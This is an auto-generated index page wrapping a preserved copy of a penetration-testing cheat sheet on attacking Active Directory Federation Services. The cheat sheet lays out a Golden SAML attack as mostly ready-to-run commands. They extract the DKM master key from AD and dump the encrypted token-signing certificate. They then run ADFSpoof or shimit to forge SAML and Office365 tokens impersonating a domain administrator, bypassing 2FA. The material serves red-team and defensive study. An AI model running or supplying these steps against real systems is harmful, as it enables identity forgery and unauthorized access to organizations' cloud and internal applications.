---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Federation Services

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adfs-federation-services` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adfs-federation-services.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Federation Services](../../topics/active-directory/active-directory-federation-services.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adfs-federation-services |
| name | Active Directory - Federation Services |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adfs-federation-services.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Federation Services\n\nActive Directory Federation Services (AD FS) is a software component developed\
  \ by Microsoft that provides users with single sign-on (SSO) access to systems and applications located across organizational\
  \ boundaries. It uses a claims-based access control authorization model to maintain application security and to provide\
  \ seamless access to web-based applications that are hosted inside or outside the corporate network.\n\n## ADFS - DKM Master\
  \ Key\n\n* The DKM key is stored in the `thumbnailPhoto` attribute of the AD contact object.\n\n```ps1\n$key=(Get-ADObject\
  \ -filter 'ObjectClass -eq \"Contact\" -and name -ne \"CryptoPolicy\"' -SearchBase \"CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local\"\
  \ -Properties thumbnailPhoto).thumbnailPhoto\n[System.BitConverter]::ToString($key)\n```\n\n## ADFS - Trust Relationship\n\
  \nGets the relying party trusts of the Federation Service.\n\n* Search for `IssuanceAuthorizationRules`\n\n    ```ps1\n\
  \    Get-AdfsRelyingPartyTrust\n    ```\n\n## ADFS - Golden SAML\n\nGolden SAML is a type of attack where an attacker creates\
  \ a forged SAML (Security Assertion Markup Language) authentication response to impersonate a legitimate user and gain unauthorized\
  \ access to a service provider. This attack leverages the trust established between the identity provider (IdP) and service\
  \ provider (SP) in a SAML-based single sign-on (SSO) system.\n\n* Golden SAML are effective even when 2FA is enabled.\n\
  * The token-signing private key is not renewed automatically\n* Changing a user’s password won't affect the generated SAML\n\
  \n**Requirements**:\n\n* ADFS service account\n* The private key (PFX with the decryption password)\n\n**Exploitation**:\n\
  \n* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on ADFS server as the **ADFS service account**. It will\
  \ query the Windows Internal Database (WID): `\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query`\n* Convert PFX and Private Key to\
  \ binary format\n\n    ```ps1\n    # For the pfx\n    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin\n    #\
  \ For the private key\n    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin \n    ```\n\n* Create the Golden SAML using\
  \ [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).\n\
  \n    ```ps1\n    mkdir ADFSpoofTools\n    cd $_\n    git clone https://github.com/dmb2168/cryptography.git\n    git clone\
  \ https://github.com/mandiant/ADFSpoof.git \n    virtualenv3 venvADFSSpoof\n    source venvADFSSpoof/bin/activate\n    pip\
  \ install lxml\n    pip install signxml\n    pip uninstall -y cryptography\n    cd cryptography\n    pip install -e .\n\
  \    cd ../ADFSpoof\n    pip install -r requirements.txt\n    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab\
  \ saml2 --endpoint https://www.contoso.com/adfs/ls\n    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient\
  \ --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name=\"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname\"\
  ><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'\n    ```\n\n**Manual Exploitation**:\n\n* Retrieve\
  \ the WID path: `Get-AdfsProperties`\n* Retrieve the ADFS Relying Party Trusts: `Get-AdfsRelyingPartyTrust`\n* Retrieve\
  \ the signing certificate, save the `EncryptedPfx` and decode it `base64 -d adfs.b64 > adfs.bin`\n\n    ```powershell\n\
  \    $cmd.CommandText = \"SELECT ServiceSettingsData from AdfsConfigurationV3.IdentityServerPolicy.ServiceSettings\"\n \
  \   $client= New-Object System.Data.SQLClient.SQLConnection($ConnectionString);\n    $client.Open();\n    $cmd = $client.CreateCommand()\n\
  \    $cmd.CommandText = \"SELECT name FROM sys.databases\"\n    $reader = $cmd.ExecuteReader()\n    $reader.Read() | Out-Null\n\
  \    $name = $reader.GetString(0)\n    $reader.Close()\n    Write-Output $name;\n    ```\n\n* Retrieve the DKM key stored\
  \ inside the `thumbnailPhoto` attribute of the Active Directory:\n\n    ```ps1\n    ldapsearch -x -H ldap://DC.domain.local\
  \ -b \"CN=ADFS,CN=Microsoft,CN=Program Data,DC=DOMAIN,DC=LOCAL\" -D \"adfs-svc-account@domain.local\" -W -s sub \"(&(objectClass=contact)(!(name=CryptoPolicy)))\"\
  \ thumbnailPhoto\n    ```\n\n* Convert the retrieved key to raw format: `echo \"RETRIEVED_KEY_HERE\" | base64 -d > adfs.key`\n\
  * Use [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof) to generate the Golden SAML\n\nNOTE: There might be multiple\
  \ master keys in the container, remember to try them all.\n\n**Golden SAML Examples**\n\n* SAML2: requires `--endpoint`,\
  \ `--nameidformat`, `--identifier`, `--nameid` and `--assertions`\n\n    ```ps1\n    python ADFSpoof.py -b adfs.bin adfs.key\
  \ -s adfs.domain.local saml2 --endpoint https://www.contoso.com/adfs/ls\n    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient\
  \ --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name=\"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname\"\
  ><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'\n    ```\n\n* Office365: requires `--upn` and `--objectguid`\n\
  \n    ```ps1\n    python3 ADFSpoof.py -b adfs.bin adfs.key -s sts.domain.local o365 --upn user@domain.local --objectguid\
  \ 712D7BFAE0EB79842D878B8EEEE239D1\n    ```\n\n* Other: connect to the service provider using a known account, analyze the\
  \ SAML token attributes given and reuse their format.\n\n**NOTE**: Sync the time between the attacker's machine generating\
  \ the Golden SAML and the ADFS server.\n\nOther interesting tools to exploit AD FS:\n\n* [secureworks/whiskeysamlandfriends/WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)\
  \ - Proof of concept for a Golden SAML attack with Remote ADFS Configuration Extraction.\n* [cyberark/shimit](https://github.com/cyberark/shimit)\
  \ - A tool that implements the Golden SAML attack\n\n    ```ps1\n    python ./shimit.py -idp http://adfs.domain.local/adfs/services/trust\
  \ -pk key -c cert.pem -u domain\\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id REDACTED\n    ```\n\n## References\n\
  \n* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)\n\
  * [Active Directory Federation Services (ADFS) Distributed Key Manager (DKM) Keys - Threat Hunter Playbook](https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html)\n\
  * [Exploring the Golden SAML Attack Against ADFS - 7 December 2021](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)\n\
  * [Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps - Shaked Reiner - 11/21/17](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)\n\
  * [Meet Silver SAML: Golden SAML in the Cloud - Tomer Nahum and Eric Woodruff - Feb 29, 2024](https://www.semperis.com/blog/meet-silver-saml/)"
_relative_path: active-directory/ad-adfs-federation-services.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adfs-federation-services.md
````
